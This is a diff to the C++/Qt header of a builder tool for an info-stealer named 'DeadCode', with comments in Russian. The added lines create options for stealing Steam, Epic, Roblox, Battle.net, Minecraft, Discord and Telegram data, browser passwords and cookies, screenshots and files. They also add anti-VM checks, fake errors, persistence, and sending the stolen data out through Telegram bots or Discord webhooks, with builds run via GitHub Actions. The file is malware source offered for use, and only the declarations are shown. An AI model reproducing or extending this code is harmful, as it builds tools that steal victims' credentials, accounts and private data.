@@ -8,6 +8,22 @@
 #include <QNetworkReply>
 #include <QByteArray>
 #include <QInputDialog>
+#include <QFileDialog>
+#include <QMessageBox>
+#include <QSettings>
+#include <QJsonDocument>
+#include <QJsonObject>
+#include <QDir>
+#include <QProcess>
+#include <QLabel>
+#include <QSpacerItem>
+#include <QLineEdit>
+#include <QComboBox>
+#include <QCheckBox>
+#include <QTextEdit>
+#include <QPushButton>
+#include <QAction>
+#include <QMutex>
 #include <array>
 #include <random>
 #include <sstream>
@@ -17,6 +33,14 @@
 #include <string>
 #include <fstream>
 #include <thread>
+#include <windows.h>
+#include <bcrypt.h>
+#include <sqlite3.h>
+#include <zip.h>
+#include <curl/curl.h>
+#include <shlwapi.h>
+#include <tlhelp32.h>
+#include <psapi.h>
 
 QT_BEGIN_NAMESPACE
 namespace Ui { class MainWindow; }
@@ -56,14 +80,61 @@ public:
         bool silent = false;               // Включение тихого режима
         bool autoStart = false;            // Включение автозапуска
         bool persist = false;              // Включение персистентности
-        std::string sendMethod = "local file"; // Метод отправки данных (Telegram, Discord, Local File)
-        std::string token = "";            // Токен для Telegram или Discord
+        std::string sendMethod = "Local File"; // Метод отправки данных (Telegram, Discord, Local File)
+        std::string buildMethod = "Local Build"; // Метод сборки (Local Build, GitHub Actions)
+        std::string telegramToken = "";    // Токен для Telegram
         std::string chatId = "";           // Chat ID для Telegram
+        std::string discordWebhook = "";   // Вебхук для Discord
         std::string filename = "DeadCode.exe"; // Имя выходного файла
         std::string encryptionKey1 = "";   // Первый ключ шифрования
         std::string encryptionKey2 = "";   // Второй ключ шифрования
         std::string encryptionSalt = "";   // Соль для шифрования
+        std::string iconPath = "";         // Путь к файлу иконки
+        std::string githubToken = "";      // Токен GitHub
+        std::string githubRepo = "";       // Репозиторий GitHub
     } config;
+
+    // UI элементы
+    QLineEdit* tokenLineEdit;              // Поле для ввода токена Telegram
+    QLineEdit* chatIdLineEdit;             // Поле для ввода Chat ID Telegram
+    QLineEdit* discordWebhookLineEdit;     // Поле для ввода вебхука Discord
+    QLineEdit* fileNameLineEdit;           // Поле для ввода имени выходного файла
+    QLineEdit* encryptionKey1LineEdit;     // Поле для ввода первого ключа шифрования
+    QLineEdit* encryptionKey2LineEdit;     // Поле для ввода второго ключа шифрования
+    QLineEdit* encryptionSaltLineEdit;     // Поле для ввода соли шифрования
+    QLineEdit* iconPathLineEdit;           // Поле для ввода пути к иконке
+    QLineEdit* githubTokenLineEdit;        // Поле для ввода токена GitHub
+    QLineEdit* githubRepoLineEdit;         // Поле для ввода имени репозитория GitHub
+    QComboBox* sendMethodComboBox;         // Выпадающий список для выбора метода отправки
+    QComboBox* buildMethodComboBox;        // Выпадающий список для выбора метода сборки
+    QCheckBox* steamCheckBox;              // Чекбокс для включения кражи данных Steam
+    QCheckBox* steamMAFileCheckBox;        // Чекбокс для включения кражи MA-файлов Steam
+    QCheckBox* epicCheckBox;               // Чекбокс для включения кражи данных Epic Games
+    QCheckBox* robloxCheckBox;             // Чекбокс для включения кражи данных Roblox
+    QCheckBox* battlenetCheckBox;          // Чекбокс для включения кражи данных Battle.net
+    QCheckBox* minecraftCheckBox;          // Чекбокс для включения кражи данных Minecraft
+    QCheckBox* discordCheckBox;            // Чекбокс для включения кражи данных Discord
+    QCheckBox* telegramCheckBox;           // Чекбокс для включения кражи данных Telegram
+    QCheckBox* chatHistoryCheckBox;        // Чекбокс для включения сбора истории чатов
+    QCheckBox* cookiesCheckBox;            // Чекбокс для включения кражи куки браузеров
+    QCheckBox* passwordsCheckBox;          // Чекбокс для включения кражи паролей браузеров
+    QCheckBox* screenshotCheckBox;         // Чекбокс для включения создания скриншота
+    QCheckBox* fileGrabberCheckBox;        // Чекбокс для включения граббера файлов
+    QCheckBox* systemInfoCheckBox;         // Чекбокс для включения сбора системной информации
+    QCheckBox* socialEngineeringCheckBox;  // Чекбокс для включения сбора данных для социальной инженерии
+    QCheckBox* antiVMCheckBox;             // Чекбокс для включения защиты от виртуальных машин
+    QCheckBox* fakeErrorCheckBox;          // Чекбокс для включения фейковой ошибки
+    QCheckBox* silentCheckBox;             // Чекбокс для включения тихого режима
+    QCheckBox* autoStartCheckBox;          // Чекбокс для включения автозапуска
+    QCheckBox* persistCheckBox;            // Чекбокс для включения персистентности
+    QTextEdit* textEdit;                   // Текстовое поле для отображения логов
+    QPushButton* iconBrowseButton;         // Кнопка для выбора иконки
+    QPushButton* buildButton;              // Кнопка для запуска сборки
+    QAction* actionSaveConfig;             // Действие для сохранения конфигурации
+    QAction* actionLoadConfig;             // Действие для загрузки конфигурации
+    QAction* actionExportLogs;             // Действие для экспорта логов
+    QAction* actionExit;                   // Действие для выхода из приложения
+    QAction* actionAbout;                  // Действие для отображения информации о программе
 
 signals:
     void logUpdated(const QString& message); // Сигнал для обновления логов
@@ -82,7 +153,7 @@ private slots:
 
     // Слоты для процесса кражи и отправки данных
     void startStealProcess();               // Запуск процесса кражи данных после успешной сборки
-    void StealAndSendData();                // Основная функция кражи и отправки данных
+    void StealAndSendData(const std::string& tempDir); // Основная функция кражи и отправки данных
     void takeScreenshot(const std::string& dir); // Создание скриншота
     void collectSystemInfo(const std::string& dir); // Сбор системной информации
     void stealBrowserData(const std::string& dir); // Кража данных браузера (пароли, куки)
@@ -97,6 +168,7 @@ private slots:
     void collectSocialEngineeringData(const std::string& dir); // Сбор данных для социальной инженерии
     void archiveData(const std::string& dir, const std::string& archivePath); // Архивация данных
     void encryptData(const std::string& inputPath, const std::string& outputPath); // Шифрование данных
+    void decryptData(const std::string& inputPath, const std::string& outputPath); // Дешифрование данных
     void sendData(const std::string& filePath);    // Отправка данных
     void sendToTelegram(const std::string& filePath); // Отправка данных в Telegram
     void sendToDiscord(const std::string& filePath);  // Отправка данных в Discord
@@ -130,10 +202,13 @@ private:
     void animateSection(QLabel* sectionLabel, QSpacerItem* spacer); // Анимация появления секций
     QByteArray applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key); // Применение XOR-шифрования
     QByteArray applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv); // Применение AES-шифрования
+    std::array<unsigned char, 16> generateIV(); // Генерация инициализационного вектора для AES
+    void emitLog(const QString& message);  // Удобный метод для вызова сигнала logUpdated
 
     // Приватные члены
     Ui::MainWindow *ui;                    // Указатель на UI, сгенерированный Qt Designer
     QNetworkAccessManager *manager;        // Менеджер для сетевых запросов (GitHub API, Telegram, Discord)
+    QMutex logMutex;                       // Мьютекс для потокобезопасного логирования
     bool isBuilding;                       // Флаг состояния сборки
     QTimer *buildTimer;                    // Таймер для обновления состояния
     QTimer *statusCheckTimer;              // Таймер для проверки статуса сборки через GitHub Actions
